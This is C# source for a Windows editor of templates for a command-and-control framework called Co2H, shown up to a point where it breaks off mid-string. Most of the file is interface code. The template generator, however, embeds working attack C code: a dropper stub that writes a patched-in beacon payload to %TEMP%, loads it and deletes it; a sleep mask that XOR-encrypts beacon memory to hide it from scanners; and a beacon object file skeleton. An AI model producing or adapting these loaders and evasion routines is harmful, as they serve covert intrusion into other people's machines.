using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Interop;
using System.Windows.Media;
using System.Xml;
using ICSharpCode.AvalonEdit.Highlighting;
using ICSharpCode.AvalonEdit.Highlighting.Xshd;

namespace KitEditor
{
    public partial class MainWindow : Window
    {
        // Корневые пути к каталогам китов (относительно расположения exe)
        private string _kitRoot;
        private string _sleepMaskDir;
        private string _processInjectDir;
        private string _bofDir;
        private string _stagersDir;
        private string _shellcodeDir;
        private string _artifactDir;

        // Текущий открытый файл
        private string _currentFile;
        private bool _modified;

        public MainWindow()
        {
            InitializeComponent();
            ResolveKitPaths();
            PopulateTree();
            ApplyGreenHighlighting();

            // F5 = пересканировать каталоги шаблонов
            this.PreviewKeyDown += (s, e) =>
            {
                if (e.Key == System.Windows.Input.Key.F5)
                {
                    PopulateTree();
                    SetStatus("Templates reloaded");
                    e.Handled = true;
                }
            };

            // Подписка на изменение текста для флага _modified
            tbEditor.TextChanged += (s, e) => { _modified = true; };

            // Иконка кнопки maximize/restore переключается при изменении состояния
            this.StateChanged += (s, e) =>
            {
                btnMax.Content = (WindowState == WindowState.Maximized) ? "❐" : "▢";
            };
        }

        // ---- Maximize фикс: ограничиваем размер окна рабочей областью монитора.
        // Без этого WindowStyle=None + WindowChrome дают перекрытие задачей и
        // выход за края экрана при WindowState=Maximized.
        protected override void OnSourceInitialized(EventArgs e)
        {
            base.OnSourceInitialized(e);
            var src = (HwndSource)PresentationSource.FromVisual(this);
            if (src != null) src.AddHook(WindowProc);
        }

        private const int WM_GETMINMAXINFO = 0x0024;
        private const uint MONITOR_DEFAULTTONEAREST = 0x00000002;

        private IntPtr WindowProc(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam, ref bool handled)
        {
            if (msg == WM_GETMINMAXINFO)
            {
                AdjustMaxBounds(hwnd, lParam);
                handled = true;
            }
            return IntPtr.Zero;
        }

        private static void AdjustMaxBounds(IntPtr hwnd, IntPtr lParam)
        {
            MINMAXINFO mmi = (MINMAXINFO)Marshal.PtrToStructure(lParam, typeof(MINMAXINFO));
            IntPtr monitor = MonitorFromWindow(hwnd, MONITOR_DEFAULTTONEAREST);
            if (monitor != IntPtr.Zero)
            {
                MONITORINFO mi = new MONITORINFO();
                mi.cbSize = Marshal.SizeOf(typeof(MONITORINFO));
                if (GetMonitorInfo(monitor, ref mi))
                {
                    RECT rcWork = mi.rcWork;
                    RECT rcMon = mi.rcMonitor;
                    // Координаты позиции - относительно текущего монитора.
                    mmi.ptMaxPosition.x = Math.Abs(rcWork.left - rcMon.left);
                    mmi.ptMaxPosition.y = Math.Abs(rcWork.top  - rcMon.top);
                    mmi.ptMaxSize.x     = Math.Abs(rcWork.right  - rcWork.left);
                    mmi.ptMaxSize.y     = Math.Abs(rcWork.bottom - rcWork.top);
                }
            }
            Marshal.StructureToPtr(mmi, lParam, true);
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT { public int x; public int y; }

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT { public int left, top, right, bottom; }

        [StructLayout(LayoutKind.Sequential)]
        private struct MINMAXINFO
        {
            public POINT ptReserved;
            public POINT ptMaxSize;
            public POINT ptMaxPosition;
            public POINT ptMinTrackSize;
            public POINT ptMaxTrackSize;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct MONITORINFO
        {
            public int cbSize;
            public RECT rcMonitor;
            public RECT rcWork;
            public uint dwFlags;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr MonitorFromWindow(IntPtr hwnd, uint dwFlags);

        [DllImport("user32.dll")]
        private static extern bool GetMonitorInfo(IntPtr hmonitor, ref MONITORINFO info);

        // ---- Custom title bar handlers ----
        private void OnTitleMinimize(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void OnTitleMaximize(object sender, RoutedEventArgs e)
        {
            WindowState = (WindowState == WindowState.Maximized)
                ? WindowState.Normal
                : WindowState.Maximized;
        }

        private void OnTitleClose(object sender, RoutedEventArgs e)
        {
            Close();
        }

        // Загружаем встроенную xshd-схему "C" и применяем к редактору.
        // Свой xshd даёт полный контроль над палитрой — без зависимости от
        // имён цветов в стандартной C++ теме AvalonEdit.
        private void ApplyGreenHighlighting()
        {
            try
            {
                IHighlightingDefinition def;
                using (Stream s = Assembly.GetExecutingAssembly()
                           .GetManifestResourceStream("KitEditor.C.xshd"))
                {
                    if (s == null) return;
                    using (XmlReader reader = XmlReader.Create(s))
                    {
                        def = HighlightingLoader.Load(reader, HighlightingManager.Instance);
                    }
                }

                HighlightingManager.Instance.RegisterHighlighting(
                    "C", new[] { ".c", ".h" }, def);

                tbEditor.SyntaxHighlighting = def;
            }
            catch (Exception ex)
            {
                SetStatus("Highlight load failed: " + ex.Message);
            }
        }

        // Определяем путь к каталогу kit/ — ищем относительно exe или по фиксированному пути
        private void ResolveKitPaths()
        {
            // Релиз: KitEditor.exe лежит прямо в kit\, рядом с подпапками
            // sleepmask\, processinject\, bof\, shellcode\, stagers\.
            // Корень кита = каталог самого exe.
            //
            // Dev: exe в kit\kit-editor\bin\Debug\. В этом случае поднимаемся
            // вверх до первой папки, в которой присутствуют sleepmask + processinject.
            string exeDir = AppDomain.CurrentDomain.BaseDirectory;

            if (LooksLikeKitRoot(exeDir))
            {
                _kitRoot = Path.GetFullPath(exeDir);
            }
            else
            {
                string cur = Path.GetFullPath(exeDir);
                while (cur != null)
                {
                    if (LooksLikeKitRoot(cur))
                    {
                        _kitRoot = cur;
                        break;
                    }
                    string parent = Path.GetDirectoryName(cur.TrimEnd(Path.DirectorySeparatorChar));
                    if (parent == null || string.Equals(parent, cur, StringComparison.OrdinalIgnoreCase))
                        break;
                    cur = parent;
                }
            }

            if (_kitRoot != null)
            {
                _sleepMaskDir = Path.Combine(_kitRoot, "sleepmask");
                _processInjectDir = Path.Combine(_kitRoot, "processinject");
                _bofDir = Path.Combine(_kitRoot, "bof");
                _stagersDir = Path.Combine(_kitRoot, "stagers");
                _shellcodeDir = Path.Combine(_kitRoot, "shellcode");
                _artifactDir = Path.Combine(_kitRoot, "artifact");
            }
        }

        // Каталог считаем корнем кита если в нём есть оба обязательных подкаталога.
        private static bool LooksLikeKitRoot(string dir)
        {
            if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) return false;
            return Directory.Exists(Path.Combine(dir, "sleepmask"))
                && Directory.Exists(Path.Combine(dir, "processinject"));
        }

        // Заполняем дерево шаблонов
        private void PopulateTree()
        {
            tvTemplates.Items.Clear();

            if (_kitRoot == null)
            {
                var errItem = new TreeViewItem { Header = "[!] kit/ not found" };
                tvTemplates.Items.Add(errItem);
                SetStatus("ERROR: kit/ directory not found");
                return;
            }

            // Artifact Kit - kit/artifact/<name>/<name>.c
            // Шаблоны EXE/DLL с секцией .co2pay для artifact-gen.
            if (Directory.Exists(_artifactDir))
            {
                var artNode = new TreeViewItem
                {
                    Header = ">> Artifact Kit",
                    IsExpanded = true,
                    FontWeight = FontWeights.Bold,
                    Tag = "kit:artifact"
                };
                AddSubfolderTemplates(artNode, _artifactDir, new[] { ".c" });
                tvTemplates.Items.Add(artNode);
            }

            // Sleep Mask Kit
            var sleepNode = new TreeViewItem
            {
                Header = ">> Sleep Mask Kit",
                IsExpanded = true,
                FontWeight = FontWeights.Bold,
                Tag = "kit:sleepmask"
            };
            AddMasksFromDir(sleepNode, Path.Combine(_sleepMaskDir, "masks"));
            // default_mask.c
            string defaultMask = Path.Combine(_sleepMaskDir, "default_mask.c");
            if (File.Exists(defaultMask))
            {
                var item = new TreeViewItem
                {
                    Header = "  default_mask.c",
                    Tag = defaultMask,
                    FontWeight = FontWeights.Normal,
                    ContextMenu = BuildTemplateContextMenu(defaultMask, /*isFolderTemplate*/ false, "default_mask.c")
                };
                sleepNode.Items.Add(item);
            }
            tvTemplates.Items.Add(sleepNode);

            // Process Inject Kit
            var injectNode = new TreeViewItem
            {
                Header = ">> Process Inject Kit",
                IsExpanded = true,
                FontWeight = FontWeights.Bold,
                Tag = "kit:processinject"
            };
            AddMasksFromDir(injectNode, Path.Combine(_processInjectDir, "masks"));
            // default_inject.c
            string defaultInject = Path.Combine(_processInjectDir, "default_inject.c");
            if (File.Exists(defaultInject))
            {
                var item = new TreeViewItem
                {
                    Header = "  default_inject.c",
                    Tag = defaultInject,
                    FontWeight = FontWeights.Normal,
                    ContextMenu = BuildTemplateContextMenu(defaultInject, /*isFolderTemplate*/ false, "default_inject.c")
                };
                injectNode.Items.Add(item);
            }
            tvTemplates.Items.Add(injectNode);

            // Beacon Object Files - подпапки kit/bof/bof_<name>/bof_<name>.c
            if (Directory.Exists(_bofDir))
            {
                var bofNode = new TreeViewItem
                {
                    Header = ">> Beacon Object Files",
                    IsExpanded = true,
                    FontWeight = FontWeights.Bold,
                    Tag = "kit:bof"
                };
                AddBofsFromDir(bofNode, _bofDir);
                tvTemplates.Items.Add(bofNode);
            }

            // Shellcode - kit/shellcode/<name>/<name>.c
            if (Directory.Exists(_shellcodeDir))
            {
                var scNode = new TreeViewItem
                {
                    Header = ">> Shellcode",
                    IsExpanded = true,
                    FontWeight = FontWeights.Bold,
                    Tag = "kit:shellcode"
                };
                AddSubfolderTemplates(scNode, _shellcodeDir, new[] { ".c" });
                tvTemplates.Items.Add(scNode);
            }

            // Stagers - kit/stagers/<name>/<entry>
            if (Directory.Exists(_stagersDir))
            {
                var stNode = new TreeViewItem
                {
                    Header = ">> Stagers",
                    IsExpanded = true,
                    FontWeight = FontWeights.Bold,
                    Tag = "kit:stagers"
                };
                AddSubfolderTemplates(stNode, _stagersDir,
                    new[] { ".ps1", ".hta", ".vbs", ".wsf", ".html", ".htm" });
                tvTemplates.Items.Add(stNode);
            }

            SetStatus("Loaded: " + _kitRoot);
        }

        // Универсальный обход: в каждой подпапке <name>/ ищем точку входа.
        // 1) <name>/<name>.<ext> для любого ext из extensions
        // 2) <name>/build.ps1 (multi-file project)
        // 3) первый файл с подходящим расширением в папке
        private void AddSubfolderTemplates(TreeViewItem parent, string root, string[] extensions)
        {
            string[] dirs = Directory.GetDirectories(root);
            Array.Sort(dirs);
            foreach (string dir in dirs)
            {
                string name = Path.GetFileName(dir);
                string entry = null;
                bool multifile = false;

                // 1) <name>/<name>.<ext>
                foreach (string ext in extensions)
                {
                    string p = Path.Combine(dir, name + ext);
                    if (File.Exists(p)) { entry = p; break; }
                }
                // 2) build.ps1 / make.ps1
                if (entry == null)
                {
                    foreach (string cand in new[] { "build.ps1", "make.ps1" })
                    {
                        string p = Path.Combine(dir, cand);
                        if (File.Exists(p)) { entry = p; multifile = true; break; }
                    }
                }
                // 3) первый файл с подходящим расширением
                if (entry == null)
                {
                    foreach (string ext in extensions)
                    {
                        string[] hits = Directory.GetFiles(dir, "*" + ext);
                        if (hits.Length > 0) { entry = hits[0]; multifile = true; break; }
                    }
                }
                if (entry == null) continue;

                var item = new TreeViewItem
                {
                    Header = "  " + name + (multifile ? " *" : ""),
                    Tag = entry,
                    ToolTip = multifile ? "Entry: " + Path.GetFileName(entry) : null,
                    FontWeight = FontWeights.Normal,
                    ContextMenu = BuildTemplateContextMenu(entry, /*isFolderTemplate*/ true, name)
                };
                parent.Items.Add(item);
            }
        }

        // BOF: каждая подпапка bof_<name>/ содержит файл bof_<name>.c.
        // Для multi-file проектов (RegPwnBOF, TGTMonitorBOF) подбираем главный
        // .c файл — это entry.c / src/main.c или единственный .c в корне.
        private void AddBofsFromDir(TreeViewItem parent, string bofRoot)
        {
            string[] dirs = Directory.GetDirectories(bofRoot);
            Array.Sort(dirs);
            foreach (string dir in dirs)
            {
                string name = Path.GetFileName(dir);

                // 1) Single-file BOF: bof_<name>/bof_<name>.c
                string singleFile = Path.Combine(dir, name + ".c");
                if (File.Exists(singleFile))
                {
                    var item = new TreeViewItem
                    {
                        Header = "  " + name,
                        Tag = singleFile,
                        FontWeight = FontWeights.Normal,
                        ContextMenu = BuildTemplateContextMenu(singleFile, /*isFolderTemplate*/ true, name)
                    };
                    parent.Items.Add(item);
                    continue;
                }

                // 2) Multi-file проект: берём первый найденный .c в корне или src/
                string mainC = null;
                string[] roots = { dir, Path.Combine(dir, "src") };
                foreach (string r in roots)
                {
                    if (!Directory.Exists(r)) continue;
                    string[] cs = Directory.GetFiles(r, "*.c");
                    if (cs.Length > 0) { mainC = cs[0]; break; }
                }
                if (mainC != null)
                {
                    var item = new TreeViewItem
                    {
                        Header = "  " + name + " *",
                        Tag = mainC,
                        FontWeight = FontWeights.Normal,
                        ToolTip = "Multi-file project: " + Path.GetFileName(mainC),
                        ContextMenu = BuildTemplateContextMenu(mainC, /*isFolderTemplate*/ true, name)
                    };
                    parent.Items.Add(item);
                }
            }
        }

        private void AddMasksFromDir(TreeViewItem parent, string masksDir)
        {
            if (!Directory.Exists(masksDir)) return;

            string[] dirs = Directory.GetDirectories(masksDir);
            Array.Sort(dirs);
            foreach (string dir in dirs)
            {
                string maskFile = Path.Combine(dir, "mask.c");
                if (File.Exists(maskFile))
                {
                    string name = Path.GetFileName(dir);
                    var item = new TreeViewItem
                    {
                        Header = "  " + name,
                        Tag = maskFile,
                        FontWeight = FontWeights.Normal,
                        ContextMenu = BuildTemplateContextMenu(maskFile, /*isFolderTemplate*/ true, name)
                    };
                    parent.Items.Add(item);
                }
            }
        }

        // Контекстное меню для шаблона: правый клик -> Delete.
        // isFolderTemplate = true: удаляем папку masks/<name>/ целиком.
        // isFolderTemplate = false: удаляем только файл (для default_mask.c / default_inject.c).
        private ContextMenu BuildTemplateContextMenu(string filePath, bool isFolderTemplate, string displayName)
        {
            var menu = new ContextMenu
            {
                Background = FindResource("PanelBrush") as Brush,
                BorderBrush = FindResource("BorderBrush") as Brush,
                Foreground = FindResource("TextBrush") as Brush
            };

            var openItem = new MenuItem
            {
                Header = "Open",
                Foreground = FindResource("TextBrush") as Brush,
                Background = FindResource("PanelBrush") as Brush,
                FontFamily = new FontFamily("Consolas")
            };
            openItem.Click += (s, e) =>
            {
                if (_modified && !ConfirmDiscard()) return;
                LoadFile(filePath);
            };
            menu.Items.Add(openItem);

            menu.Items.Add(new Separator { Background = FindResource("BorderBrush") as Brush });

            var deleteItem = new MenuItem
            {
                Header = "Delete",
                Foreground = new SolidColorBrush(Color.FromRgb(0xFF, 0x66, 0x66)),
                Background = FindResource("PanelBrush") as Brush,
                FontFamily = new FontFamily("Consolas")
            };
            deleteItem.Click += (s, e) => DeleteTemplate(filePath, isFolderTemplate, displayName);
            menu.Items.Add(deleteItem);

            return menu;
        }

        // Удаляет шаблон с диска + обновляет дерево.
        private void DeleteTemplate(string filePath, bool isFolderTemplate, string displayName)
        {
            string what = isFolderTemplate
                ? "template '" + displayName + "' (folder + mask.c)"
                : "file '" + Path.GetFileName(filePath) + "'";

            var result = MessageBox.Show(
                "Delete " + what + "?\n\nThis cannot be undone.",
                "Kit Editor",
                MessageBoxButton.YesNo,
                MessageBoxImage.Warning);

            if (result != MessageBoxResult.Yes) return;

            try
            {
                if (isFolderTemplate)
                {
                    string dir = Path.GetDirectoryName(filePath);
                    string parentName = !string.IsNullOrEmpty(dir)
                        ? Path.GetFileName(Path.GetDirectoryName(dir))
                        : null;

                    // Защита: удаляем только если папка лежит под одним из китов
                    bool ok = !string.IsNullOrEmpty(dir) && Directory.Exists(dir) &&
                              (parentName == "masks"
                               || parentName == "bof"
                               || parentName == "shellcode"
                               || parentName == "stagers"
                               || parentName == "artifact");
                    if (ok)
                    {
                        Directory.Delete(dir, recursive: true);
                    }
                    else
                    {
                        SetStatus("ERROR: unexpected template location, refusing delete");
                        return;
                    }
                }
                else
                {
                    if (File.Exists(filePath)) File.Delete(filePath);
                }
            }
            catch (Exception ex)
            {
                SetStatus("Delete failed: " + ex.Message);
                return;
            }

            // Если был открыт удалённый файл - очистить редактор
            if (string.Equals(_currentFile, filePath, StringComparison.OrdinalIgnoreCase))
            {
                tbEditor.Text = "";
                _currentFile = null;
                _modified = false;
                tbFileName.Text = "no file";
            }

            PopulateTree();
            SetStatus("Deleted: " + (isFolderTemplate ? displayName : Path.GetFileName(filePath)));
        }

        // Обработчик выбора шаблона в дереве
        private void OnTemplateSelected(object sender, RoutedPropertyChangedEventArgs<object> e)
        {
            var item = tvTemplates.SelectedItem as TreeViewItem;
            if (item == null || item.Tag == null) return;

            string filePath = item.Tag.ToString();
            if (!File.Exists(filePath)) return;

            if (_modified && !ConfirmDiscard()) return;

            LoadFile(filePath);
        }

        private void LoadFile(string path)
        {
            try
            {
                string content = File.ReadAllText(path, Encoding.UTF8);
                tbEditor.Text = content;
                _currentFile = path;
                _modified = false;

                string relPath = _kitRoot != null
                    ? path.Substring(_kitRoot.Length).TrimStart('\\', '/')
                    : Path.GetFileName(path);
                tbFileName.Text = relPath;
                SetStatus("Opened: " + Path.GetFileName(path));
            }
            catch (Exception ex)
            {
                SetStatus("ERROR: " + ex.Message);
            }
        }

        // ----- Toolbar handlers -----

        private void OnNew(object sender, RoutedEventArgs e)
        {
            if (_modified && !ConfirmDiscard()) return;

            // Шаг 1: определить кит. Сначала смотрим выделение в дереве,
            // если ничего подходящего — спрашиваем диалогом.
            string kit = DetectSelectedKit();
            if (kit == null)
            {
                kit = AskKit();
                if (kit == null) return; // пользователь отменил
            }

            // Шаг 2: запросить имя шаблона.
            // Имя - это имя папки под masks/, файл внутри всегда mask.c.
            string name = AskTemplateName(kit);
            if (string.IsNullOrEmpty(name)) return;

            // Если пользователь по привычке указал .c / .h - срезаем суффикс
            if (name.EndsWith(".c", StringComparison.OrdinalIgnoreCase) ||
                name.EndsWith(".h", StringComparison.OrdinalIgnoreCase))
            {
                name = name.Substring(0, name.Length - 2);
            }
            // Заменяем пробелы и тире на подчёркивание - частая опечатка
            name = name.Replace(' ', '_').Replace('-', '_').Trim('_');

            if (name.Length == 0)
            {
                SetStatus("ERROR: empty name");
                return;
            }

            // Только латиница / цифры / подчёркивание
            foreach (char ch in name)
            {
                if (!(char.IsLetterOrDigit(ch) || ch == '_'))
                {
                    SetStatus("ERROR: name must be [A-Za-z0-9_] only");
                    return;
                }
            }

            // Шаг 3: создать каталог и файл.
            // Структура отличается: для sleep/inject - masks/<name>/mask.c,
            // для BOF - <name>/<name>.c (имя файла совпадает с папкой).
            string targetDir;
            string targetFile;
            if (kit == "bof")
            {
                // Имя BOF принято префиксовать "bof_" - дополним если забыли
                if (!name.StartsWith("bof_", StringComparison.OrdinalIgnoreCase))
                    name = "bof_" + name;
                targetDir = Path.Combine(_bofDir, name);
                targetFile = Path.Combine(targetDir, name + ".c");
            }
            else if (kit == "artifact")
            {
                // Имя должно начинаться с exe_ или dll_ - это влияет на сборку
                bool hasPrefix = name.StartsWith("exe_", StringComparison.OrdinalIgnoreCase)
                              || name.StartsWith("dll_", StringComparison.OrdinalIgnoreCase);
                if (!hasPrefix) name = "exe_" + name;
                targetDir = Path.Combine(_artifactDir, name);
                targetFile = Path.Combine(targetDir, name + ".c");
            }
            else
            {
                string baseDir = (kit == "sleepmask") ? _sleepMaskDir : _processInjectDir;
                targetDir = Path.Combine(baseDir, "masks", name);
                targetFile = Path.Combine(targetDir, "mask.c");
            }

            if (File.Exists(targetFile))
            {
                SetStatus("ERROR: template '" + name + "' already exists");
                return;
            }

            try
            {
                Directory.CreateDirectory(targetDir);
                File.WriteAllText(targetFile, BuildTemplateSkeleton(kit, name), Encoding.UTF8);
            }
            catch (Exception ex)
            {
                SetStatus("Create failed: " + ex.Message);
                return;
            }

            // Шаг 4: обновить дерево, выделить новый узел, открыть в редакторе
            PopulateTree();
            LoadFile(targetFile);
            ExpandAndSelect(kit, name);
            SetStatus("Created: " + Path.GetFileName(Path.GetDirectoryName(targetFile)) + "/mask.c");
        }

        // Определить кит по текущему выделению в дереве.
        // Возвращает "sleepmask" / "processinject" или null.
        private string DetectSelectedKit()
        {
            var sel = tvTemplates.SelectedItem as TreeViewItem;
            if (sel == null) return null;

            // Если выделен корневой узел кит — у него Tag = "kit:<name>"
            string tag = sel.Tag as string;
            if (tag != null && tag.StartsWith("kit:"))
                return tag.Substring(4);

            // Иначе ищем родителя
            var parent = ItemsControl.ItemsControlFromItemContainer(sel) as TreeViewItem;
            if (parent != null)
            {
                string pTag = parent.Tag as string;
                if (pTag != null && pTag.StartsWith("kit:"))
                    return pTag.Substring(4);
            }
            return null;
        }

        // Диалог выбора кита.
        private string AskKit()
        {
            var dlg = new Window
            {
                Title = "Select Kit",
                Width = 360, Height = 250,
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Owner = this,
                ResizeMode = ResizeMode.NoResize,
                Background = FindResource("BgBrush") as Brush
            };
            var stack = new StackPanel { Margin = new Thickness(16) };
            stack.Children.Add(new TextBlock
            {
                Text = "Choose target kit:",
                Foreground = FindResource("HeaderBrush") as Brush,
                FontFamily = new FontFamily("Consolas"),
                FontSize = 13,
                Margin = new Thickness(0, 0, 0, 12)
            });

            string result = null;
            var sleepBtn  = new Button { Content = ">> Sleep Mask Kit",     Margin = new Thickness(0, 0, 0, 6) };
            var injectBtn = new Button { Content = ">> Process Inject Kit", Margin = new Thickness(0, 0, 0, 6) };
            var bofBtn    = new Button { Content = ">> Beacon Object Files", Margin = new Thickness(0, 0, 0, 6) };
            var artBtn    = new Button { Content = ">> Artifact Kit" };
            sleepBtn.Click  += (s, e) => { result = "sleepmask";     dlg.Close(); };
            injectBtn.Click += (s, e) => { result = "processinject"; dlg.Close(); };
            bofBtn.Click    += (s, e) => { result = "bof";           dlg.Close(); };
            artBtn.Click    += (s, e) => { result = "artifact";      dlg.Close(); };

            stack.Children.Add(sleepBtn);
            stack.Children.Add(injectBtn);
            stack.Children.Add(bofBtn);
            stack.Children.Add(artBtn);
            dlg.Content = stack;
            dlg.ShowDialog();
            return result;
        }

        // Диалог ввода имени нового template.
        private string AskTemplateName(string kit)
        {
            var dlg = new Window
            {
                Title = "New " + kit + " template",
                Width = 420, Height = 170,
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Owner = this,
                ResizeMode = ResizeMode.NoResize,
                Background = FindResource("BgBrush") as Brush
            };
            var stack = new StackPanel { Margin = new Thickness(16) };
            stack.Children.Add(new TextBlock
            {
                Text = "Template name (will create masks/<name>/mask.c):",
                Foreground = FindResource("HeaderBrush") as Brush,
                FontFamily = new FontFamily("Consolas"),
                FontSize = 12,
                Margin = new Thickness(0, 0, 0, 8)
            });
            var tb = new TextBox
            {
                FontFamily = new FontFamily("Consolas"),
                FontSize = 13,
                Background = new SolidColorBrush(Color.FromRgb(5, 5, 5)),
                Foreground = FindResource("AccentBrush") as Brush,
                CaretBrush = FindResource("AccentBrush") as Brush,
                BorderBrush = FindResource("BorderBrush") as Brush,
                Padding = new Thickness(6, 4, 6, 4),
                Margin = new Thickness(0, 0, 0, 12)
            };
            stack.Children.Add(tb);

            var btnRow = new StackPanel { Orientation = Orientation.Horizontal, HorizontalAlignment = HorizontalAlignment.Right };
            var okBtn = new Button { Content = "[OK]", Margin = new Thickness(0, 0, 6, 0), MinWidth = 80, IsDefault = true };
            var cancelBtn = new Button { Content = "[Cancel]", MinWidth = 80, IsCancel = true };
            btnRow.Children.Add(okBtn);
            btnRow.Children.Add(cancelBtn);
            stack.Children.Add(btnRow);

            string result = null;
            okBtn.Click += (s, e) => { result = tb.Text.Trim(); dlg.Close(); };
            cancelBtn.Click += (s, e) => { dlg.Close(); };

            dlg.Content = stack;
            tb.Focus();
            dlg.ShowDialog();
            return result;
        }

        // Каркас нового template — разный для каждого кита.
        private string BuildTemplateSkeleton(string kit, string name)
        {
            if (kit == "artifact")
            {
                bool isDll = name.StartsWith("dll_", StringComparison.OrdinalIgnoreCase);
                string entry = isDll
                    ? "BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {\n" +
                      "    if (reason != DLL_PROCESS_ATTACH) return TRUE;\n"
                    : "int WINAPI WinMain(HINSTANCE h, HINSTANCE prev, LPSTR cmd, int show) {\n" +
                      "    (void)h; (void)prev; (void)cmd; (void)show;\n";
                string tail = isDll
                    ? "    return TRUE;\n}\n"
                    : "    Sleep(INFINITE);\n    return 0;\n}\n";
                return
                    "// " + name + ".c -- Co2H Artifact Kit stub.\n" +
                    "//\n" +
                    "// Has a .co2pay section: [magic 8B][size 4B][payload bytes].\n" +
                    "// artifact-gen patches the section with a real beacon DLL/shellcode.\n" +
                    "// At runtime: verify magic -> drop payload to %TEMP% -> LoadLibrary\n" +
                    "// -> delete file -> sleep.\n" +
                    "//\n" +
                    "// Naming convention:\n" +
                    "//   exe_*  -> built as .exe (WinMain entry)\n" +
                    "//   dll_*  -> built as .dll (DllMain entry, /DLL link)\n" +
                    "\n" +
                    "#include <windows.h>\n" +
                    "\n" +
                    "#define MAX_PAYLOAD (512 * 1024)\n" +
                    "// Sentinel \"CO2HPAYL\" as a 64-bit LE integer.\n" +
                    "#define MAGIC_U64 0x4C59415048324F43ULL\n" +
                    "\n" +
                    "#pragma section(\".co2pay\", read)\n" +
                    "__declspec(allocate(\".co2pay\"))\n" +
                    "static const unsigned char g_payload[MAX_PAYLOAD + 12] = {\n" +
                    "    'C','O','2','H','P','A','Y','L',  /* magic   */\n" +
                    "    0,0,0,0,                          /* size    */\n" +
                    "    /* payload bytes patched by artifact-gen */\n" +
                    "};\n" +
                    "\n" +
                    entry +
                    "    if (*(unsigned long long*)g_payload != MAGIC_U64) return 1;\n" +
                    "    unsigned int dll_size = *(unsigned int*)(g_payload + 8);\n" +
                    "    if (!dll_size || dll_size > MAX_PAYLOAD) return 1;\n" +
                    "    const unsigned char* dll_bytes = g_payload + 12;\n" +
                    "\n" +
                    "    wchar_t tmpdir[MAX_PATH + 1], tmppath[MAX_PATH + 1];\n" +
                    "    GetTempPathW(MAX_PATH, tmpdir);\n" +
                    "    GetTempFileNameW(tmpdir, L\"c2h\", 0, tmppath);\n" +
                    "\n" +
                    "    HANDLE hf = CreateFileW(tmppath, GENERIC_WRITE, 0, NULL,\n" +
                    "                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n" +
                    "    if (hf == INVALID_HANDLE_VALUE) return 1;\n" +
                    "    DWORD wrote = 0;\n" +
                    "    WriteFile(hf, dll_bytes, dll_size, &wrote, NULL);\n" +
                    "    CloseHandle(hf);\n" +
                    "\n" +
                    "    HMODULE mod = LoadLibraryW(tmppath);\n" +
                    "    DeleteFileW(tmppath);\n" +
                    "    if (!mod) return 1;\n" +
                    "\n" +
                    tail;
            }
            if (kit == "bof")
            {
                return
                    "// " + name + ".c -- Co2H Beacon Object File.\n" +
                    "//\n" +
                    "// BOF is a COFF object file (.obj) parsed and executed by the beacon\n" +
                    "// loader. Entry point: void go(char* args, int alen).\n" +
                    "//\n" +
                    "// Rules:\n" +
                    "//   - No CRT, no globals, no string-literal storage in .data (use stack).\n" +
                    "//   - Imports go through LIBRARY$Function naming, declared DECLSPEC_IMPORT.\n" +
                    "//   - Use Beacon* API for output and arg parsing.\n" +
                    "//\n" +
                    "// Build:  cl /c /GS- /Zl /TC /I.. " + name + ".c\n" +
                    "//   -> bin\\" + name + ".x64.obj\n" +
                    "\n" +
                    "#include \"../bof_api.h\"\n" +
                    "\n" +
                    "// ---- Imports (LIBRARY$Function) ----\n" +
                    "DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetCurrentProcessId(VOID);\n" +
                    "\n" +
                    "// ---- Entry point ----\n" +
                    "void go(char* args, int alen) {\n" +
                    "    // Parse arguments (if any) via BeaconDataParse/BeaconDataInt/...\n" +
                    "    datap parser;\n" +
                    "    BeaconDataParse(&parser, args, alen);\n" +
                    "    (void)parser;\n" +
                    "\n" +
                    "    // Do work\n" +
                    "    DWORD pid = KERNEL32$GetCurrentProcessId();\n" +
                    "\n" +
                    "    // Output to operator console\n" +
                    "    BeaconPrintf(CALLBACK_OUTPUT, \"[" + name + "] pid=%d\\n\", (int)pid);\n" +
                    "}\n";
            }
            if (kit == "sleepmask")
            {
                return
                    "// " + name + ".mask -- Co2H sleep mask template.\n" +
                    "//\n" +
                    "// Position-independent code (PIC): no globals, no string literals,\n" +
                    "// no CRT. Use only function pointers from SleepMaskCtx.\n" +
                    "// Entry point MUST be at offset 0 of .text (define helpers AFTER).\n" +
                    "\n" +
                    "#include \"../../sleep_mask_api.h\"\n" +
                    "\n" +
                    "// ---- ENTRY POINT (must be first defined function) -------------------------\n" +
                    "\n" +
                    "void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {\n" +
                    "    uint32_t i;\n" +
                    "    SIZE_T   sz;\n" +
                    "    PVOID    base;\n" +
                    "    ULONG    old_prot;\n" +
                    "\n" +
                    "    // 1. Encrypt regions (XOR with ctx->key) and mark PAGE_READWRITE.\n" +
                    "    for (i = 0; i < ctx->region_count; i++) {\n" +
                    "        base = ctx->regions[i].base;\n" +
                    "        sz   = ctx->regions[i].size;\n" +
                    "        ctx->NtProtectVirtualMemory(ctx->process_handle, &base, &sz,\n" +
                    "                                    /*PAGE_READWRITE*/ 0x04, &old_prot);\n" +
                    "\n" +
                    "        // XOR with 16-byte key\n" +
                    "        uint8_t* p = (uint8_t*)ctx->regions[i].base;\n" +
                    "        for (uint32_t j = 0; j < ctx->regions[i].size; j++)\n" +
                    "            p[j] ^= ctx->key[j & 15];\n" +
                    "    }\n" +
                    "\n" +
                    "    // 2. Sleep.\n" +
                    "    LARGE_INTEGER delay;\n" +
                    "    delay.QuadPart = -((LONGLONG)ctx->sleep_ms * 10000); // 100-ns units, negative = relative\n" +
                    "    ctx->NtDelayExecution(FALSE, &delay);\n" +
                    "\n" +
                    "    // 3. Decrypt and restore original protection.\n" +
